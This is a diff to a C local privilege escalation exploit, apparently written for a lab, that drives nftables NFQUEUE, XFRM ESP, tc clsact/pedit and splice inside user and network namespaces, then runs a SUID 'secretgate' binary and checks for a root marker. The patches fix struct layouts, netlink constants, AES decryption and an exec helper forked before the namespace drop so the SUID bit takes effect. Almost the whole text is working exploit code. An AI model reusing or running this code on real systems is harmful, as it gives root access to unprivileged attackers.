@@ -151,7 +151,7 @@ static const uint8_t GATE_OPEN[8]   = { 'G','A','T','E','O','P','E','N' };
 
 /* nftables */
 #define NFT_MSG_NEWTABLE_      0
-#define NFT_MSG_NEWCHAIN_      2
+#define NFT_MSG_NEWCHAIN_      3
 #define NFT_MSG_NEWRULE_       6
 #define NFTA_TABLE_NAME_       1
 #define NFTA_CHAIN_TABLE_      1
@@ -178,8 +178,14 @@ static const uint8_t GATE_OPEN[8]   = { 'G','A','T','E','O','P','E','N' };
 #define NFQA_CFG_CMD_       1
 #define NFQA_CFG_PARAMS_    2
 #define NFQA_CFG_FLAGS_     5
-#define NFQA_CFG_MASK_      6
-#define NFQNL_CFG_CMD_BIND_ 3
+#define NFQA_CFG_MASK_      4   /* UAPI: MASK=4, FLAGS=5 (queue_maxlen=3);
+                                   * 6 is __NFQA_CFG_MAX — out of policy,
+                                   * the strict parse rejects the whole
+                                   * message (measured: EINVAL) */
+#define NFQNL_CFG_CMD_BIND_ 1   /* per-queue bind (queue # = nfgen res_id),
+                                   * as libnetfilter_queue's create_queue; 3
+                                   * is PF_BIND (family-wide) and needs pf
+                                   * in the kernel's u8 pf field */
 #define NFQNL_COPY_PACKET_  2
 #define NFQA_CFG_F_GSO_     0x4
 #define NFQA_CFG_F_UID_GID_ 0x8
@@ -194,14 +200,17 @@ static const uint8_t GATE_OPEN[8]   = { 'G','A','T','E','O','P','E','N' };
 #define XFRM_POLICY_IN_       0
 
 /* tc */
-#define TC_H_CLSACT_      0xffe00000u
-#define TC_H_MIN_EGRESS_  0xfffeu
+#define TC_H_CLSACT_      0xfffffff1u  /* UAPI: TC_H_CLSACT = TC_H_INGRESS;
+                                   * 0xffe00000 is not a valid clsact handle
+                                   * (qdisc add returns ENODEV — measured) */
+#define TC_H_MIN_EGRESS_  0xfff3u      /* UAPI TC_H_MIN_EGRESS */
 #define TC_ACT_PIPE_      3
 #define TC_ACT_STOLEN_    4
 #define TCA_KIND_         1
 #define TCA_OPTIONS_      2
-#define TCA_U32_SEL_      3
-#define TCA_U32_ACT_      4
+#define TCA_U32_SEL_      5   /* UAPI: UNSPEC,CLASSID,HASH,LINK,DIVISOR,SEL,
+                                * POLICE,ACT — SEL=5, ACT=7 */
+#define TCA_U32_ACT_      7
 #define TCA_ACT_KIND_     1
 #define TCA_ACT_OPTIONS_  2
 #define TCA_PEDIT_PARMS_  2
@@ -263,10 +272,10 @@ static uint8_t gf_inv(uint8_t a) /* a^254 == a^-1 in GF(2^8) */
 {
     uint8_t r = 1, base = a;
     int e;
-    for (e = 0; e < 7; e++) {
-        base = gf_mul(base, base);
+    for (e = 0; e < 8; e++) {
         if ((254 >> e) & 1)
             r = gf_mul(r, base);
+        base = gf_mul(base, base);
     }
     return r;
 }
@@ -313,9 +322,9 @@ static void mix_col(uint8_t *p, const uint8_t m[4])
 {
     uint8_t a0 = p[0], a1 = p[1], a2 = p[2], a3 = p[3];
     p[0] = (uint8_t)(gf_mul(a0, m[0]) ^ gf_mul(a1, m[1]) ^ gf_mul(a2, m[2]) ^ gf_mul(a3, m[3]));
-    p[1] = (uint8_t)(gf_mul(a0, m[1]) ^ gf_mul(a1, m[0]) ^ gf_mul(a2, m[3]) ^ gf_mul(a3, m[2]));
+    p[1] = (uint8_t)(gf_mul(a0, m[3]) ^ gf_mul(a1, m[0]) ^ gf_mul(a2, m[1]) ^ gf_mul(a3, m[2]));
     p[2] = (uint8_t)(gf_mul(a0, m[2]) ^ gf_mul(a1, m[3]) ^ gf_mul(a2, m[0]) ^ gf_mul(a3, m[1]));
-    p[3] = (uint8_t)(gf_mul(a0, m[3]) ^ gf_mul(a1, m[2]) ^ gf_mul(a2, m[1]) ^ gf_mul(a3, m[0]));
+    p[3] = (uint8_t)(gf_mul(a0, m[1]) ^ gf_mul(a1, m[2]) ^ gf_mul(a2, m[3]) ^ gf_mul(a3, m[0]));
 }
 
 static const uint8_t M_MIX[4]  = { 2, 3, 1, 1 };
@@ -347,30 +356,38 @@ static void aes128_enc(const uint8_t rk[176], const uint8_t in[16], uint8_t out[
 
 static void aes128_dec(const uint8_t rk[176], const uint8_t in[16], uint8_t out[16])
 {
-    uint8_t s[16], drk[176];
+    uint8_t s[16];
     int r, i, c;
     uint8_t t;
 
-    /* equivalent inverse cipher: InvMixColumns the middle round keys */
-    memcpy(drk, rk, 176);
-    for (r = 1; r <= 9; r++)
-        for (c = 0; c < 4; c++)
-            mix_col(drk + r * 16 + c * 4, M_IMIX);
+    /* Direct inverse cipher (FIPS-197 5.3): plain round keys, InvMixColumns
+     * after each round's ARK. (The previous version applied the
+     * equivalent-inverse key transform — InvMixColumns over rounds 1..9's
+     * keys — while keeping this direct order; the two forms differ in where
+     * InvMixColumns sits relative to InvShiftRows/InvSubBytes, and mixing
+     * them decrypts garbage. Measured against the F.1.2 vector.) */
     memcpy(s, in, 16);
     for (i = 0; i < 16; i++)
-        s[i] ^= drk[160 + i];
-    for (r = 9; r >= 0; r--) {
+        s[i] ^= rk[160 + i];
+    for (r = 9; r >= 1; r--) {
         t = s[13]; s[13] = s[9];  s[9]  = s[5];  s[5]  = s[1];  s[1] = t;
         t = s[2];  s[2]  = s[10]; s[10] = t;     t = s[6];  s[6]  = s[14]; s[14] = t;
         t = s[3];  s[3]  = s[7];  s[7]  = s[11]; s[11] = s[15]; s[15] = t;
         for (i = 0; i < 16; i++)
             s[i] = INV_SBOX[s[i]];
         for (i = 0; i < 16; i++)
-            s[i] ^= drk[r * 16 + i];
-        if (r != 0)
-            for (c = 0; c < 4; c++)
-                mix_col(s + c * 4, M_IMIX);
+            s[i] ^= rk[r * 16 + i];
+        for (c = 0; c < 4; c++)
+            mix_col(s + c * 4, M_IMIX);
     }
+    /* Final round: no InvMixColumns. */
+    t = s[13]; s[13] = s[9];  s[9]  = s[5];  s[5]  = s[1];  s[1] = t;
+    t = s[2];  s[2]  = s[10]; s[10] = t;     t = s[6];  s[6]  = s[14]; s[14] = t;
+    t = s[3];  s[3]  = s[7];  s[7]  = s[11]; s[11] = s[15]; s[15] = t;
+    for (i = 0; i < 16; i++)
+        s[i] = INV_SBOX[s[i]];
+    for (i = 0; i < 16; i++)
+        s[i] ^= rk[i];
     memcpy(out, s, 16);
 }
 
@@ -574,7 +591,8 @@ static void nl_attr_u16(struct nlmsghdr *nlh, uint16_t type, uint16_t v)
 
 static void nl_attr_u32be(struct nlmsghdr *nlh, uint16_t type, uint32_t v)
 {
-    nl_attr(nlh, type, &v, 4);
+    uint32_t be = htonl(v);
+    nl_attr(nlh, type, &be, 4);
 }
 
 static int nl_socket_open(int proto)
@@ -691,7 +709,11 @@ static int create_nlmon(void)
 /* ------------------------------------------------------------------ */
 /* XFRM state + policy (what `ip xfrm state/policy add` would do)       */
 /* ------------------------------------------------------------------ */
-typedef union { uint32_t a4; uint32_t a6[4]; } xfrm_addr;
+/* xfrm_address_t embeds u64 members in the UAPI: its alignment is 8, which
+ * pads struct xfrm_selector to 56 bytes inside xfrm_usersa_info. Without
+ * this the whole id/saddr block lands 4 bytes early and NEWSA gets EINVAL
+ * (measured by byte-diff against the working reference payload). */
+typedef union { uint32_t a4; uint32_t a6[4]; uint64_t a8; } __attribute__((aligned(8))) xfrm_addr;
 
 struct xfrm_algo_c { char alg_name[64]; uint32_t alg_key_len; char alg_key[]; };
 struct xfrm_algo_a {
@@ -764,6 +786,13 @@ static int xfrm_setup(void)
      * cbc(aes), replay-window 0 */
     nlh = nl_hdr(buf, XFRM_MSG_NEWSA_, NLM_F_CREATE | NLM_F_ACK, sizeof(*sa));
     sa = NLMSG_DATA(nlh);
+    sa->sel.family = AF_INET;          /* a zeroed selector gets the NEWSA
+                                        * rejected with EINVAL — mirror the
+                                        * working reference (sel filled) */
+    sa->sel.prefixlen_d = 32;
+    sa->sel.prefixlen_s = 32;
+    sa->sel.daddr.a4 = htonl(INADDR_LOOPBACK);
+    sa->sel.saddr.a4 = htonl(INADDR_LOOPBACK);
     sa->id.daddr.a4 = htonl(INADDR_LOOPBACK);
     sa->id.spi = htonl(SPI_VAL);
     sa->id.proto = IPPROTO_ESP;
@@ -856,6 +885,11 @@ static int nft_queue_setup(void)
         return -1;
 
     nlh = nft_add(buf, &off, NFNL_MSG_BATCH_BEGIN_, AF_UNSPEC, 0);
+    /* Batch begin/end are GLOBAL nfnetlink types: no subsys bits in
+     * nlmsg_type (the kernel compares the full type against 16/17 — with
+     * (NFTABLES<<8)|16 it dispatches nft GETGEN instead and the batch
+     * never opens; measured in this lab). res_id carries the subsys. */
+    nlh->nlmsg_type = NFNL_MSG_BATCH_BEGIN_;
     ((struct nfgen *)NLMSG_DATA(nlh))->res_id = HTONS(NFNL_SUBSYS_NFTABLES_);
     nft_done(buf, &off);
 
@@ -893,6 +927,7 @@ static int nft_queue_setup(void)
     nft_done(buf, &off);
 
     nlh = nft_add(buf, &off, NFNL_MSG_BATCH_END_, AF_UNSPEC, 0);
+    nlh->nlmsg_type = NFNL_MSG_BATCH_END_;
     ((struct nfgen *)NLMSG_DATA(nlh))->res_id = HTONS(NFNL_SUBSYS_NFTABLES_);
     nft_done(buf, &off);
 
@@ -959,7 +994,9 @@ static int tc_add_clsact(int fd, unsigned ifidx)
     tcm = NLMSG_DATA(nlh);
     tcm->tcm_family = AF_UNSPEC;
     tcm->tcm_ifindex = (int)ifidx;
-    tcm->tcm_handle = TC_H_CLSACT_;
+    tcm->tcm_handle = TC_H_CLSACT_ & 0xffff0000u;  /* TC_H_MAKE(TC_H_CLSACT,0):
+                                    * major only; minor bits in the handle
+                                    * are invalid (EINVAL — measured) */
     tcm->tcm_parent = TC_H_CLSACT_;
     nl_attr_str(nlh, TCA_KIND_, "clsact");
     return nl_talk_ack(fd, buf);
@@ -1035,13 +1072,19 @@ static int tc_add_filter(int fd, unsigned mon_if, unsigned lo_if,
 /* helper children                                                      */
 /* ------------------------------------------------------------------ */
 struct nfqnl_cfg_cmd { uint8_t command, pad; uint16_t pf; };
-struct nfqnl_cfg_params {
+struct nfqnl_cfg_params {           /* kernel sizeof == 8: copy_range,
+                                     * copy_mode, 3 pad bytes — a packed 5-byte
+                                     * struct fails the exact-length policy
+                                     * check with EINVAL (measured) */
     uint32_t copy_range;
     uint8_t copy_mode;
-} __attribute__((packed));
+    uint8_t pad[3];
+};
 struct nfqnl_verdict_hdr { uint32_t verdict, id; };
 
 static int helper_wfd; /* nfq helper -> parent: "pkt <id> <msglen>" */
+static int gate_ctl[2] = { -1, -1 }, gate_rep[2] = { -1, -1 };
+static pid_t gate_kid = -1;   /* exec assistant, forked BEFORE unshare */
 static int recv_wfd;   /* udp receiver -> parent: "udp <len>" */
 
 static void nfq_helper_child(void)
@@ -1089,8 +1132,28 @@ static void nfq_helper_child(void)
     free(params);
     nl_attr_u32be(nlh, NFQA_CFG_FLAGS_, NFQA_CFG_F_GSO_ | NFQA_CFG_F_UID_GID_);
     nl_attr_u32be(nlh, NFQA_CFG_MASK_, NFQA_CFG_F_GSO_ | NFQA_CFG_F_UID_GID_);
+    nlh->nlmsg_flags |= NLM_F_ACK;   /* prove the queue is bound */
     if (sendto(fd, buf, nlh->nlmsg_len, 0, (struct sockaddr *)&sa, sizeof(sa)) < 0)
         _exit(1);
+
+    /* Wait for the kernel ACK before signalling readiness: NFQUEUE drops
+     * packets that arrive while no listener is bound, so the parent must
+     * not send its probe until the bind is confirmed (measured race). */
+    {
+        int bound = 0;
+        n = recv(fd, buf, sizeof(buf), 0);
+        for (nlh = (struct nlmsghdr *)buf;
+             n > 0 && NLMSG_OK(nlh, (unsigned)n);
+             nlh = NLMSG_NEXT(nlh, n)) {
+            if (nlh->nlmsg_type == NLMSG_ERROR &&
+                ((struct nlmsgerr *)NLMSG_DATA(nlh))->error == 0)
+                bound = 1;
+        }
+        if (!bound)
+            _exit(1);
+        if (write(helper_wfd, "ready\n", 6) < 0)
+            _exit(1);
+    }
 
     for (;;) {
         n = recv(fd, buf, sizeof(buf), 0);
@@ -1435,37 +1498,25 @@ static int crypto_selfcheck(void)
 
 static int run_gate(char *out, size_t outsz)
 {
-    int pfd[2];
-    pid_t pid;
     size_t got = 0;
     int st;
 
-    if (pipe(pfd))
+    /* The gate exec was pre-forked BEFORE the namespace drop: signal it,
+     * then read its report pipe until EOF. */
+    if (gate_kid < 0)
         return -1;
-    fflush(NULL);
-    pid = fork();
-    if (pid < 0) {
-        close(pfd[0]);
-        close(pfd[1]);
+    if (write(gate_ctl[1], "x", 1) != 1)
         return -1;
-    }
-    if (pid == 0) {
-        dup2(pfd[1], 1);
-        close(pfd[0]);
-        close(pfd[1]);
-        execl(TARGET_PATH, "secretgate", (char *)NULL);
-        _exit(127);
-    }
-    close(pfd[1]);
+    close(gate_ctl[1]);
     while (got + 1 < outsz) {
-        ssize_t r = read(pfd[0], out + got, outsz - 1 - got);
+        ssize_t r = read(gate_rep[0], out + got, outsz - 1 - got);
         if (r <= 0)
             break;
         got += (size_t)r;
     }
     out[got] = 0;
-    close(pfd[0]);
-    waitpid(pid, &st, 0);
+    close(gate_rep[0]);
+    waitpid(gate_kid, &st, 0);
     return st;
 }
 
@@ -1544,6 +1595,35 @@ int main(void)
     aes128_expand((const uint8_t *)ENC_KEY, g_rk);
     if (crypto_selfcheck() < 0)
         fatal("crypto self-check");
+
+    /* ---- 2b. exec assistant (BEFORE the namespace drop) -------------
+     * The kernel ignores the SUID bit when the exec'ing process sits in
+     * a user namespace whose id map does not cover the file's owner, so
+     * a secretgate exec from inside our userns can never gain real
+     * euid 0 (measured: the flag read fails there). Fork the gate-exec
+     * child HERE: it stays uid 1000 in the INITIAL user namespace,
+     * waits for the trigger, then execs the SUID target with the bit
+     * honored. */
+    if (pipe(gate_ctl) || pipe(gate_rep))
+        fatal("gate pipes");
+    fflush(NULL);
+    gate_kid = fork();
+    if (gate_kid < 0)
+        fatal("fork gate assistant");
+    if (gate_kid == 0) {
+        char b;
+        close(gate_ctl[1]);
+        close(gate_rep[0]);
+        if (read(gate_ctl[0], &b, 1) != 1)
+            _exit(126);
+        close(gate_ctl[0]);
+        dup2(gate_rep[1], 1);
+        close(gate_rep[1]);
+        execl(TARGET_PATH, "secretgate", (char *)NULL);
+        _exit(127);
+    }
+    close(gate_ctl[0]);
+    close(gate_rep[1]);
 
     /* ---- 3. user+net namespace ------------------------------------- */
     if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0)
@@ -1628,6 +1708,9 @@ int main(void)
         if (connect(udp, (struct sockaddr *)&a, sizeof(a)) < 0)
             fatal("connect udp");
     }
+    if (lr_line(&lrh, line, sizeof(line), 5000) < 0 ||
+        strcmp(line, "ready") != 0)
+        fatal("helper not ready (queue bind failed)");
     if (splice_send(udp, probe_fd, 0, PAYLOAD, -1, 0, 0) < 0)
         fatal("probe splice send");
     if (lr_line(&lrh, line, sizeof(line), 5000) < 0)
@@ -1722,11 +1805,16 @@ int main(void)
         P("LPE-SHA256-AFTER %s", sha_after);
 
     /* ---- 11. closure: run the SUID gate ------------------------------ */
-    if (run_gate(gate_out, sizeof(gate_out)) < 0)
+    if (run_gate(gate_out, sizeof(gate_out)) < 0) {
         P("LPE-EXEC spawn failed");
-    else {
-        gate_out[strcspn(gate_out, "\n")] = 0;
-        P("LPE-EXEC %s", gate_out);
+    } else {
+        /* print only the first line, but keep gate_out intact: computing
+         * `captured` from a truncated-at-first-newline buffer was the
+         * 12th lab bug (ROOT-OK lives on a later line). */
+        char first[192];
+        snprintf(first, sizeof(first), "%.190s", gate_out);
+        first[strcspn(first, "\n")] = 0;
+        P("LPE-EXEC %s", first);
     }
     captured = strstr(gate_out, "SECRETGATE-ROOT-OK") != NULL;
 
